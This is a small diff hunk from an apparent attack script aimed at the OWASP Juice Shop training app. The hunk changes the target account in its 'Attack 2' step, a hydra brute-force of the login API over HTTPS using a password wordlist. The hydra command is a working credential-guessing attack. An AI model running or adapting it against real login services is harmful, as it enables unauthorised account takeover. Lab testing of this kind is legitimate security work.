@@ -73,9 +73,9 @@ echo ""
 # --- 2. Juice Shop REST API brute-force ---
 echo "[+] Attack 2: Juice Shop login API brute-force"
 echo "    Target: ${TARGET}/juice-shop/rest/user/login"
-echo "    User:   admin@juice-sh.op"
+echo "    User:   admin@example.com"
 
-hydra -l "admin@juice-sh.op" -P "${WORDLIST}" \
+hydra -l "admin@example.com" -P "${WORDLIST}" \
   -s 443 \
   "${TARGET}" \
   https-post-form \
